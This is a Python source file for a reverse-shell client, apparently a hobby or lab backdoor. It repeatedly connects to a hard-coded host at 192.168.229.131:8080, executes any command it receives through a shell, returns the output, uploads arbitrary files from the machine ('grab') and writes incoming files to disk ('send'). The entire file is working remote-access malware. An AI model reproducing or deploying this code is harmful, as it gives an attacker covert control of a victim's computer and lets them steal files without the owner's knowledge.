# client.py
# works on TCP
# Keeps tuning to establish the connection with Server
# Change directory (Executed 'cd' shell command)
# TCP bidirectional data transfer (Infiltrate and exfiltrate)-Client

import socket
import subprocess
import os
import time

def initiate():
    tuneConnection()

def tuneConnection():
    mySocket = socket.socket()
    # trying to connect every 20 seconds
    while True:
        time.sleep(20)
        try:
            mySocket.connect(("192.168.229.131", 8080))
            shell(mySocket)

        except:
            tuneConnection()
def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, "rb")
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('FILE NOT FOUND'.encode())

def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, "ab")
        while True:
            bits = mySocket.recv(5000)
            if bits.endswith('DONE'.encode()):
                # Write those last received bits without the word 'DONE' - 4 characters
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)

def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())
                break

        #command format: grab*<File Path>
        # example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: send*<destination path>*<File Name>
        # Example: send*C:\Users\John\Desktop\*photo.jpeg
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        # Command Format: "cd<space><Path name>"
        # split using the space between 'cd' and path name
        # (Because, path name also may have spaces, that confuses the script)
        # And explicitly tell the OS to change the directory

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())
def main():
    initiate()

main()
